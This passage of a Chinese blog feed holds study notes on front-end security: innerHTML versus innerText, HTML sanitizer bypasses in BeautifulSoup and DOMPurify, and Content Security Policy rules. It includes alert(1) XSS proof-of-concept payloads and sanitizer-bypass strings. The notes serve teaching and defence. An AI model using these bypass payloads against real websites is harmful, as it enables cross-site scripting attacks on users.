<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>一般来说加个<code>target=&quot;_blank&quot;</code>，就可以解决上面的问题<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://kaikaix.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在chrome中，点开上面的会先新建一个about:blank，然后在打开博客<br>在firefox中，会先新建一个空页面，在打开博客<br>但是所有都是先新建一个空页面，再去操作<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是如上的情况就只会新建一个页面，然后不会有其他的操作<br>但是这只是用鼠标左键的情况<br>当你用鼠标中键，也就是按一下那个滚轮，或者你用ctrl加左键，同样可以触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p>
<h2 id="题外话-innerHTML和innerText"><a href="#题外话-innerHTML和innerText" class="headerlink" title="题外话 innerHTML和innerText"></a>题外话 innerHTML和innerText</h2><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>现在有一个test.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;可控，但是无法绕过引号&#x27;</span></span><br></pre></td></tr></table></figure><br>另一个页面加载了该js<br>这时候应该怎么去执行xss<br>如果是<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>是无法执行的，innerHTML禁止了script标签<br>这时候可以用img标签onerror属性去绕过<br>也可以用iframe标签的srcdoc去绕过<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="comment">//当然下面这种也是可以的</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>属性中的内容是可以经过编码的<br>之前sekaictf拿到golf jail我就以为有了编码就不可能存在xss了</p>
<h3 id="innerText"><a href="#innerText" class="headerlink" title="innerText"></a>innerText</h3><p>接下来看看innerText<br>还是一样的代码，只不过改成innerText<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerText</span> = <span class="string">&#x27;&lt;iframe&lt;?php echo ($_GET[&#x27;</span>name<span class="string">&#x27;]) ?&gt;&gt;&lt;/iframe&gt;&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>可以看到他将你输入的尖括号之类的特殊字符都进行了html编码，那么就不会在存在xss漏洞了<br>但是有一点比较奇怪，当你从innerText中取东西，比如下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>虽然<code>&lt;a&gt;</code>中的内容经过了编码，但是显示却是下面的内容<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>所以就会有一种情况，当年输入的内容被编码了，但是如果有以下的代码，就有可能会被绕过<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">123</span> <span class="attr">id</span>=<span class="string">a</span>&gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerHTML</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;a&quot;</span>).<span class="property">innerText</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>为什么不用<code>&lt;script&gt;</code>标签，上面提过innerHTML是不会去执行script标签下的代码的</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全4-Sanitization（笔记）</title>
    <url>/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇主要讲讲xss的绕过和防御</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315367">https://ithelp.ithome.com.tw/articles/10315367</a><span id="more"></span>
</li>
</ul>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>上一篇讲过了，编码在一些情况下是无法进行过滤xss的，下面是一些常见框架或语言过滤xss的方法</p>
<ul>
<li>前端：一般使用<code>innerText</code>来代替<code>innerHTML</code></li>
<li>Laravel： <code>&#123;&#123; $text &#125;&#125;</code>是编码的，<code>&#123;!! $text !!&#125;</code>是原本的</li>
<li>Jinja：<code>&#123;&#123; test &#125;&#125;</code> 是编码的，<code>&#123;&#123; text | safe &#125;&#125;</code>是原始格式</li>
</ul>
<p>但是有些时候，就是需要输出一些带有html的代码，这时候应该如何去过滤</p>
<h2 id="sanitize"><a href="#sanitize" class="headerlink" title="sanitize"></a>sanitize</h2><p>先来说说BeautifulSoup，当你用他进行解析html，想过滤一些东西的时候，就有可能会出现问题<br>先来看看简单的demo<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段代码的output是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: script</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: img</span><br><span class="line">attrs: &#123;<span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>: <span class="string">&#x27;alert(1)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><br>但是当你遇到下面的代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段的输出是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br></pre></td></tr></table></figure><br>看上去好像没问题，因为这行代码看上去是注释<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br></pre></td></tr></table></figure><br>但是其实，在浏览器的解析中碰到第一个<code>&gt;</code>的时候就已经闭合注释了，但是BeautifulSoup中，他是解析为到最后一个<code>&gt;</code>都是注释<br>这里有相应的ctf题</p>
<ul>
<li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md</a></li>
<li><a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization</a></li>
</ul>
<h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>基本用法如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br></pre></td></tr></table></figure><br>他并不是单纯的过滤或者编码<br>该套件运行一些安全的tag，和一些安全的attr<br>当然可以通过配置增加一些tag或者attr，如下<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=https://example.com&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe src=&quot;https://example.com&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>但是可以看到，对于不安全的代码，仍然会过滤掉，但是在一些情况下也不会被过滤掉<br>就比如下面这种<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;srcdoc&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt></p>
<h3 id="xhtml和html"><a href="#xhtml和html" class="headerlink" title="xhtml和html"></a>xhtml和html</h3><p>在style标签底下的尖括号都不会被DOMPurify给过滤<br>这是一个挺重要的特性，在之前DOMPurify变体中就会造成绕过，在html和xhtml的解析标准不同下，也会造成绕过的漏洞<br>还有一个特点就是，在属性中的内容也不会被转义<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;]]&gt;&lt;/style&gt;&lt;script&gt;&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在html中这段看似没问题，DOMPurify也不会对他进行过滤<br>但是在xhtml中，CDATA那段就会被视为注释<br><figure class="highlight xhtml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>最后就会解析成这种样子</p>
<h2 id="错误的使用这些库的方式"><a href="#错误的使用这些库的方式" class="headerlink" title="错误的使用这些库的方式"></a>错误的使用这些库的方式</h2><p>这里因为没有亲身经历过，也没办法复现，还是去看huli大佬的博客吧</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全5-CSP（笔记）</title>
    <url>/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10315612">https://ithelp.ithome.com.tw/articles/10315612</a><span id="more"></span>
<h2 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h2>网页要加上CSP策略有3种方法</li>
<li>HTTP Respond header加上 Content-Security-Policy</li>
<li>加上<code>meta</code>标签</li>
<li><h3 style="text-decoration: line-through;">iframe标签，在本章不讲</h3>

</li>
</ul>
<p>先看个简单的案例<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;none&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>上面的html并不会有弹窗，因为被csp策略阻止了<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br><code>script-src &#39;none&#39;</code>的意思就是禁止任何脚本执行，包括</p>
<h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>在上面的例子就用了<code>script-src &#39;none&#39;</code>导致了任何的脚本都不会被执行，包括onerror那些<br><code>default-src</code>就是预设的指示，如果某个指示，例如<code>script-src</code>没有设置任何规则，那么就会使用<code>default-src</code>的规则。<br>但是有几个是不会使用<code>default-src</code>的内容的，如下</p>
<ul>
<li>base-uri</li>
<li>form-action</li>
<li>frame-ancestors</li>
<li>report-uri</li>
<li>sandbox</li>
</ul>
<p>详细内容请看<br><a href="https://content-security-policy.com/default-src/">https://content-security-policy.com/default-src/</a></p>
<p>还有其他的指示，我这里直接使用huli佬的<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>下面两个链接是官方文档</p>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://content-security-policy.com">https://content-security-policy.com</a></li>
</ul>
<p>当然，每个指示都会有相应的规则，那么一般使用哪些规则呢，我这里也偷懒直接用huli佬的截图</p>
<p><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></p>
<p>例如<code>script-src *</code>就相当于允许除了<code>data:</code>,<code>blob:</code>，还有<code>file:</code>,demo如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">test.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>但是直接运行的话，就像下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p>
<p>这种直接运行的还是不行。只能用加载js的方式<code>&lt;script src=xxx&gt;</code>。<br>想直接运行代码，还是得用<code>unsafe-inline</code></p>
<h3 id="script-src-规则"><a href="#script-src-规则" class="headerlink" title="script-src 规则"></a>script-src 规则</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><p>允许执行inline js<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><p>前一个策略允许执行js代码，但是不会运行动态执行js代码，也就是说<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;&#x27;</span>)()</span><br></pre></td></tr></table></figure><br>类似这些<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="comment">&lt;!-- 仍然需要unsafe-inline，不然不能执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="nonce-xxx"><a href="#nonce-xxx" class="headerlink" title="nonce-xxx"></a>nonce-xxx</h4><p>允许<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-123&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">123</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>不允许执行不一样的与csp中的nonce不一样的</p>
<h4 id="sha256-xxxx"><a href="#sha256-xxxx" class="headerlink" title="sha256-xxxx"></a>sha256-xxxx</h4><p>我这里用一段python代码完成这个，也方便以后的操作<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">hash_object = hashlib.sha256(message.encode())</span><br><span class="line">hash_base64 = base64.b64encode(hash_object.digest())</span><br><span class="line"><span class="built_in">print</span>(hash_base64.decode())</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/5.png" alt></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 